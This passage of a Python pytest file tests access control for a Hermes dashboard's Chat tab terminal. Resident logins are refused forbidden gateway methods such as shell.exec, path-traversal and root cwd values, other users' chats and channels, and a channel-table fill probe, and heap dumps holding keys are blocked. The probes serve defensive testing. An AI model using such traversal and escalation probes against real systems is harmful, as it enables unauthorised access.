        for key in ("VISUAL", "EDITOR", "HERMES_BIN", "BROWSER"):
            assert env[key] == g.PTY_INERT_COMMAND and not os.path.exists(env[key]), key
        assert (env["HERMES_TUI_DASHBOARD"], env["HERMES_TUI_DISABLE_MOUSE"], env["HERMES_TUI_DISABLE_MOUSE_CLICKS"]) == (
            "1", "1", "1")
        assert chat_tab.resolved[-1] == {"resume": None, "sidecar_url": None, "profile": None,
                                         "active_session_file": chat_tab.resolved[-1]["active_session_file"],
                                         "workspace_cwd": chat}
        (grant,) = g.pty_grants()
        assert (grant.login, grant.role, grant.state, grant.channel) == ("edgecity:owner-id", "resident", "bound",
                                                                         "chat-own-1")
        with admin.websocket_connect(f"/api/ws?ticket={ticket(admin)}") as asock:
            ready(asock)
            asid = create(asock)
            with child.websocket_connect(f"/api/ws?internal={cred}") as tui:
                ready(tui)
                osid = create(tui, params={"cwd": chat})
                assert hermes.tui_server._sessions[osid]["auth_user_id"] == "edgecity:owner-id"
                assert hermes.tui_server._sessions[osid]["cwd"] == chat
                for i, (method, params) in enumerate(TUI_ESCAPES):
                    assert code_of(rpc_call(tui, method, params, rid=10 + i)) == 4031, method
                assert code_of(rpc_call(tui, "approval.respond", {"session_id": osid, "choice": "always"}, rid=40)) == 4031
                assert code_of(rpc_call(tui, "request.answer", {"id": "srq-x", "result": {"choice": "always"}},
                                        rid=41)) == 4031
                foreign = rpc_call(tui, "session.title", {"session_id": asid, "title": "x"}, rid=42)
                assert code_of(foreign) == 4031 and foreign["error"]["data"]["reason"] == "not_own_session"
                assert code_of(rpc_call(tui, "session.resume", {"session_id": "admin-chat"}, rid=43)) == 4031
                assert code_of(rpc_call(tui, "session.title", {"session_id": osid, "title": "mine"}, rid=44)) is None
                assert code_of(rpc_call(tui, "prompt.submit", {"session_id": osid, "text": "hello"}, rid=45)) is None
        # Its sidecar publishes on its own channel only; it opens no other socket.
        assert closed_with(child, f"/api/pub?internal={cred}&channel=chat-own-1") is None
        for url in (f"/api/pub?internal={cred}&channel=chat-other", f"/api/pub?internal={cred}",
                    f"/api/pub?internal={cred}&channel=chat-own-1&channel=chat-other",
                    f"/api/console?internal={cred}", f"/api/pty?internal={cred}",
                    f"/api/events?internal={cred}&channel=chat-own-1"):
            assert closed_with(child, url) is not None and closed_with(child, url)[0] in (4401, 4403), url
    # The tab closed: the PTY is closed and its credential is revoked.
    assert wait_for(lambda: g.pty_grants() == [])
    assert grant.state == "revoked"
    assert closed_with(child, f"/api/ws?internal={cred}")[0] == 4401
    assert g.counts().get("pty_revoked_closed", 0) + g.counts().get("pty_revoked_exited", 0) >= 1


def test_hermes_r4_every_method_the_tui_sends_meets_the_resident_table(chat_tab):
    """Every gateway method the 0.21.5 TUI can send (slash commands, overlays, keys, polls) over the
    Chat tab child's own socket: on RESIDENT_GATEWAY_METHODS, or refused 4031 (never Hermes's
    -32601, which the TUI would read as a version mismatch)."""
    hermes = chat_tab.hermes
    g = hermes.guard
    owner = as_role(hermes, "owner")
    assert set(TUI_METHODS) <= set(hermes.tui_server._methods) | {"gateway.ping"}
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}") as pty:
        cred = query_of(child_env(pty)["HERMES_TUI_GATEWAY_URL"])["internal"][0]
        with hermes.client().websocket_connect(f"/api/ws?internal={cred}") as tui:
            ready(tui)
            refused = []
            for i, method in enumerate(m for m in TUI_METHODS if m not in g.RESIDENT_GATEWAY_METHODS):
                frame = rpc_call(tui, method, {}, rid=100 + i)
                assert code_of(frame) == 4031, (method, frame)
                refused.append(method)
    assert "shell.exec" in refused and "slash.exec" in refused and "config.get" in refused
    assert hermes.calls == []


def test_hermes_r4_an_admins_chat_tab_keeps_the_process_credential(chat_tab):
    hermes = chat_tab.hermes
    admin = as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&channel=chat-adm-1") as pty:
        env = child_env(pty)
    process = hermes.ws_tickets.internal_ws_credential()
    assert query_of(env["HERMES_TUI_GATEWAY_URL"])["internal"] == [process]
    assert "VISUAL" not in env and env["HERMES_HOME"] == str(hermes.home)
    assert hermes.guard.pty_grants() == []
    with hermes.client().websocket_connect(f"/api/ws?internal={process}") as sock:
        ready(sock)
        assert code_of(rpc_call(sock, "plugins.manage", {"action": "list"})) != 4031


@pytest.mark.parametrize("query,reason", [
    ("profile=work", "edgecity_pty_profile"),
    ("profile=default", "edgecity_pty_profile"),
    ("profile=current&profile=work", "edgecity_pty_profile"),
    ("cwd=HOME", "edgecity_pty_cwd"),
    ("cwd=/", "edgecity_pty_cwd"),
    ("cwd=HOME/resident-chat/..", "edgecity_pty_cwd"),
    ("resume=admin-chat", "edgecity_pty_resume"),
    ("resume=admin", "edgecity_pty_resume"),  # Hermes's prefix match lands on admin-chat
    ("resume=pty-chat", "edgecity_pty_resume"),
    ("resume=no-such-chat", "edgecity_pty_resume"),
    ("resume=own-chat&resume=admin-chat", "edgecity_pty_resume"),
])
def test_hermes_r4_a_chat_tab_the_owner_may_not_open_is_refused_before_accept(chat_tab, query, reason):
    hermes = chat_tab.hermes
    seed_rows(hermes)
    owner = as_role(hermes, "owner")
    query = query.replace("HOME", urllib.parse.quote(str(hermes.home)))
    assert closed_with(owner, f"/api/pty?ticket={ticket(owner)}&{query}") == (4401, f"auth: {reason}")
    assert chat_tab.spawned == [] and chat_tab.resolved == [] and hermes.guard.pty_grants() == []


@pytest.mark.parametrize("query", ["profile=current", "profile=", "cwd=HOME/resident-chat", "resume=own-chat",
                                   "resume=tg-chat", "channel=chat-own-9&fresh=1"])
def test_hermes_r4_the_owners_own_chat_tab_opens(chat_tab, query):
    hermes = chat_tab.hermes
    seed_rows(hermes)
    owner = as_role(hermes, "owner")
    query = query.replace("HOME", urllib.parse.quote(str(hermes.home)))
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&{query}") as pty:
        env = child_env(pty)
    assert len(chat_tab.spawned) == 1 and "HERMES_TUI_GATEWAY_URL" in env
    if "resume=" in query:
        assert env["HERMES_TUI_RESUME"] == query.split("=", 1)[1]


def test_hermes_r4_another_logins_channel_is_refused(chat_tab):
    """The channel ties a tab to its active-session file and its sidebar feed: an admin's is not
    the owner's to open (it would resume the admin's chat or feed the admin's sidebar)."""
    hermes = chat_tab.hermes
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&channel=chat-adm-2") as pty:
        child_env(pty)
    assert closed_with(owner, f"/api/pty?ticket={ticket(owner)}&channel=chat-adm-2") == (4401, "auth: edgecity_pty_channel")
    assert closed_with(owner, f"/api/pty?ticket={ticket(owner)}&channel=chat-adm-2&channel=chat-own-3") == (
        4401, "auth: edgecity_pty_channel")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-3") as pty:
        child_env(pty)
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-3") as pty:
        child_env(pty)  # its own channel again (a refresh)


def test_hermes_r4_the_chat_hermes_settles_on_must_be_the_owners_before_anything_spawns(chat_tab):
    """The resume Hermes resolves after accept: the channel's active-session file (no `?resume=`)
    and the newest descendant of an owned chat. Another login's: refused with a line in the tab and
    1011, nothing spawned."""
    from hermes_state import SessionDB

    hermes = chat_tab.hermes
    seed_rows(hermes)
    db = SessionDB(db_path=hermes.home / "state.db")
    try:
        db.create_session(session_id="own-parent", source="tool", user_id="edgecity:owner-id")
        # A continuation child (not `tool`: Hermes follows continuation edges only) under another login.
        db.create_session(session_id="adm-child", source="tui", user_id="edgecity:admin-id",
                          parent_session_id="own-parent")
    finally:
        db.close()
    owner = as_role(hermes, "owner")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-4") as pty:
        child_env(pty)
    spawned = len(chat_tab.spawned)
    active = hermes.chat._active_session_file_for_channel(hermes.app, "chat-own-4")
    active.write_text('{"session_id": "admin-chat"}', encoding="utf-8")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-4") as pty:
        data, texts, close = read_pty(pty, lambda d, t: any("not yours" in x for x in t))
    assert any(x.startswith("\r\n\x1b[31mChat could not start: That chat is not yours.") for x in texts), texts
    assert len(chat_tab.spawned) == spawned and hermes.guard.counts()["denied_pty_resume"] == 1
    active.write_text('{"session_id": "own-chat"}', encoding="utf-8")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-4") as pty:
        assert child_env(pty)["HERMES_TUI_RESUME"] == "own-chat"
    spawned = len(chat_tab.spawned)
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&resume=own-parent") as pty:
        data, _texts, _close = read_pty(pty, lambda d, t: any("not yours" in x for x in t))
    assert len(chat_tab.spawned) == spawned and hermes.guard.counts()["denied_pty_resume"] == 2
    assert hermes.guard.pty_grants() == []


def test_hermes_r4_revoked_when_the_child_exits_and_its_open_sockets_are_closed(chat_tab):
    hermes = chat_tab.hermes
    g = hermes.guard
    owner = as_role(hermes, "owner")
    pty_cm = owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-5")
    pty = pty_cm.__enter__()
    try:
        cred = query_of(child_env(pty)["HERMES_TUI_GATEWAY_URL"])["internal"][0]
        tui_cm = hermes.client().websocket_connect(f"/api/ws?internal={cred}")
        tui = tui_cm.__enter__()
        ready(tui)
    finally:
        pty_cm.__exit__(None, None, None)
    # The tab is gone: Hermes closed the bridge, the guard revoked the credential and closes the
    # child's open gateway socket.
    closed = receive_close(tui)
    assert closed is not None and closed.get("code") == 4401, closed
    with __import__("contextlib").suppress(Exception):
        tui_cm.__exit__(None, None, None)
    assert closed_with(hermes.client(), f"/api/ws?internal={cred}")[0] == 4401
    # A child that exits by itself (a crash, the TUI quitting): the session ends, never a shell.
    chat_tab.exit_at_once = True
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-own-6") as pty:
        cred2 = query_of(child_env(pty)["HERMES_TUI_GATEWAY_URL"])["internal"][0]
        _data, _texts, close = read_pty(pty, lambda d, t: False)
    assert close is not None  # Hermes closed the tab's socket on the child's EOF
    assert wait_for(lambda: g.pty_grants() == [])
    assert closed_with(hermes.client(), f"/api/ws?internal={cred2}")[0] == 4401


def test_hermes_r4_attach_tokens_are_per_login_and_a_login_holds_at_most_its_limit(chat_tab, monkeypatch):
    """`?attach=` is the client's own token: an owner presenting an admin's reattaches nothing of
    the admin's (its terminal is keyed under its own login); four tabs held open by one owner: the
    fourth is refused with Hermes's own "too many chat terminals"."""
    from hermes_cli import pty_bridge

    hermes = chat_tab.hermes
    g = hermes.guard

    class FakeBridge:
        def __init__(self):
            self.written = bytearray()

        def read(self, timeout=0.2):
            import time

            time.sleep(min(timeout, 0.05))
            return b""

        async def write(self, data):
            self.written.extend(data)
            return True

        def resize(self, cols, rows):
            pass

        def close(self):
            pass

    bridges = []

    def fake_spawn(argv, **kwargs):
        bridges.append(FakeBridge())
        return bridges[-1]

    monkeypatch.setattr(pty_bridge.PtyBridge, "spawn", staticmethod(fake_spawn))
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    registry = hermes.chat.PTY_REGISTRY
    with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&attach=TOK1") as asock:
        asock.send_bytes(b"admin-typed")
        assert wait_for(lambda: bytes(bridges[0].written) == b"admin-typed") if bridges else wait_for(lambda: bridges)
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&attach=TOK1") as osock:
        osock.send_bytes(b"owner-typed")
        assert wait_for(lambda: len(bridges) == 2), (len(bridges), sorted(registry._sessions), g.counts())
    assert wait_for(lambda: bytes(bridges[1].written) == b"owner-typed")
    assert b"owner-typed" not in bytes(bridges[0].written)
    keys = sorted(registry._sessions)
    assert keys[0] == "TOK1" and keys[1].startswith("edgecity-resident:") and keys[1].endswith("\0TOK1")
    # The owner's limit (3): its own detached TOK1 makes room for a third open tab; with three open,
    # a fourth is refused. The admin's detached terminal is never touched.
    import contextlib

    with contextlib.ExitStack() as stack:
        for tok in ("A", "B", "C"):
            stack.enter_context(owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&attach={tok}"))
        assert wait_for(lambda: len(bridges) == 5)
        assert g.counts()["pty_resident_evicted"] == 1 and not any(k.endswith("\0TOK1") for k in registry._sessions)
        assert "TOK1" in registry._sessions
        with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&attach=D") as fourth:
            _data, texts, close = read_pty(fourth, lambda d, t: any("too many" in x for x in t))
        assert any("Chat could not start: too many chat terminals" in x for x in texts) and len(bridges) == 5
        assert g.counts()["denied_pty_limit"] >= 1
    assert len([gr for gr in g.pty_grants() if gr.login == "edgecity:owner-id"]) == g.RESIDENT_PTYS_PER_LOGIN


# ==================================================================================================
# Round 5 (SEC1-refute4): the channel table per login and released; no heap dump
# ==================================================================================================


def as_user(hermes, user_id, role="owner"):
    """A signed-in client for another login than `<role>-id` (a second resident on the box)."""
    client = hermes.client()
    client.cookies.set("hermes_session_at",
                       hermes.registry.get_provider("edgecity")._mint(user_id, f"{user_id}@example.org", role).access_token)
    return client


def test_hermes_r5_open_and_close_tabs_never_fill_the_channel_table(chat_tab, monkeypatch):
    """S-rf4-1, the refuter's fill probe (`test_refute4_fill.py`) past the per-login bound: one owner
    opens and closes tabs on new channels, with children that end at once. It is never refused, its
    entries go with its tabs, and then its own next tab, another owner's and an admin's open and
    run. (At round 4 the box-wide table filled and refused every resident's next tab.)"""
    from hermes_cli import pty_bridge

    hermes = chat_tab.hermes
    g = hermes.guard
    counted = pty_bridge.PtyBridge.spawn  # the fixture's real, counted spawn
    quick = {"on": True}

    class EofBridge:
        def read(self, timeout=0.2):
            return None

        async def write(self, data):
            return True

        def resize(self, cols, rows):
            pass

        def close(self):
            pass

    monkeypatch.setattr(pty_bridge.PtyBridge, "spawn",
                        staticmethod(lambda argv, **kw: EofBridge() if quick["on"] else counted(argv, **kw)))
    owner, other, admin = as_role(hermes, "owner"), as_user(hermes, "owner2-id"), as_role(hermes, "admin")
    cycles = g.PTY_CHANNELS_PER_LOGIN + 8
    for i in range(cycles):
        # Each tab spawns (its child ends at once) and Hermes closes it; never refused before accept.
        with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-fill-{i}") as pty:
            _data, texts, close = read_pty(pty, lambda d, t: False)
        assert close is not None and not texts, (i, texts, g.counts())
        assert wait_for(lambda: f"chat-fill-{i}" not in g._pty_channels), (i, g._pty_channels)
    assert g.counts()["pty_resident_spawned"] == cycles and g._pty_channels == {}
    quick["on"] = False
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-after") as pty:
        child_env(pty)
        assert g._pty_channels.get("chat-after") == "edgecity:owner-id"
    assert wait_for(lambda: "chat-after" not in g._pty_channels)  # dropped with its credential
    with other.websocket_connect(f"/api/pty?ticket={ticket(other)}&channel=chat-other") as pty:
        child_env(pty)
    with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&channel=chat-adm-after") as pty:
        child_env(pty)
    counts = g.counts()
    assert counts.get("pty_channel_released", 0) >= cycles + 1, counts
    assert "denied_pty_channel" not in counts and "denied_pty_channels" not in counts


def test_hermes_r5_a_login_at_its_channel_bound_gets_its_own_code_and_blocks_no_one(chat_tab, monkeypatch):
    hermes = chat_tab.hermes
    g = hermes.guard
    monkeypatch.setattr(g, "PTY_CHANNELS_PER_LOGIN", 1)
    owner, other, admin = as_role(hermes, "owner"), as_user(hermes, "owner2-id"), as_role(hermes, "admin")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-o1") as pty:
        child_env(pty)
        assert closed_with(owner, f"/api/pty?ticket={ticket(owner)}&channel=chat-o2") == (
            4401, "auth: edgecity_pty_channels")
        with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-o1") as again:
            child_env(again)  # its own channel: a refresh
        assert wait_for(lambda: len(g.pty_grants()) == 1) and g._pty_channels.get("chat-o1") == "edgecity:owner-id"
        with other.websocket_connect(f"/api/pty?ticket={ticket(other)}&channel=chat-b1") as other_pty:
            child_env(other_pty)  # another resident: untouched by the owner's bound
        for name in ("chat-a1", "chat-a2"):  # an admin is never refused; its own oldest makes room
            with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&channel={name}") as admin_pty:
                child_env(admin_pty)
        assert g._pty_channels.get("chat-a2") == "edgecity:admin-id" and "chat-a1" not in g._pty_channels
    assert g.counts()["denied_pty_channels"] == 1


def test_hermes_r5_a_tab_refused_after_admission_holds_no_channel(chat_tab):
    """The channel is recorded when the spawn is committed, not at admission: a tab whose settled
    chat is another login's, or one over the login's terminal limit, leaves no entry."""
    hermes = chat_tab.hermes
    g = hermes.guard
    seed_rows(hermes)
    owner = as_role(hermes, "owner")
    active = hermes.chat._active_session_file_for_channel(hermes.app, "chat-r5-w")
    active.parent.mkdir(parents=True, exist_ok=True)
    active.write_text('{"session_id": "admin-chat"}', encoding="utf-8")
    try:
        with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-r5-w") as pty:
            _data, texts, _close = read_pty(pty, lambda d, t: any("not yours" in x for x in t))
    finally:
        active.unlink(missing_ok=True)
    assert "chat-r5-w" not in g._pty_channels and chat_tab.spawned == [] and g.pty_grants() == []
    import contextlib

    with contextlib.ExitStack() as stack:
        for i in range(g.RESIDENT_PTYS_PER_LOGIN):
            child_env(stack.enter_context(owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-l{i}")))
        with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-over") as over:
            _data, texts, _close = read_pty(over, lambda d, t: any("chat terminals open" in x for x in t))
        assert "chat-over" not in g._pty_channels
        assert sorted(c for c, o in g._pty_channels.items() if o == "edgecity:owner-id") == ["chat-l0", "chat-l1", "chat-l2"]
    assert wait_for(lambda: "edgecity:owner-id" not in g._pty_channels.values())


def test_hermes_r5_a_residents_tui_writes_no_heap_dump(chat_tab):
    """N-rf4-1: `/heapdump` (and the dump on start or at a memory threshold) writes a V8 snapshot
    of the TUI, which holds its env (the box's provider keys, the tab's credential), to
    `HERMES_HEAPDUMP_DIR`. A resident's child gets a directory that cannot be made, so the dump
    fails; an admin's keeps the box's."""
    hermes = chat_tab.hermes
    g = hermes.guard
    owner, admin = as_role(hermes, "owner"), as_role(hermes, "admin")
    with owner.websocket_connect(f"/api/pty?ticket={ticket(owner)}&channel=chat-r5-h") as pty:
        env = child_env(pty)
    assert env["HERMES_HEAPDUMP_DIR"] == g.PTY_NO_HEAPDUMP_DIR
    with pytest.raises(NotADirectoryError):  # what the TUI's `mkdir(dir, {recursive: true})` meets
        os.makedirs(env["HERMES_HEAPDUMP_DIR"], exist_ok=True)
    assert not (hermes.home / "heapdumps").exists()
    assert not os.path.exists(os.path.join(env["HOME"], ".hermes", "heapdumps"))
    with admin.websocket_connect(f"/api/pty?ticket={ticket(admin)}&channel=chat-r5-ha") as pty:
        assert child_env(pty)["HERMES_HEAPDUMP_DIR"] == str(hermes.home / "heapdumps")
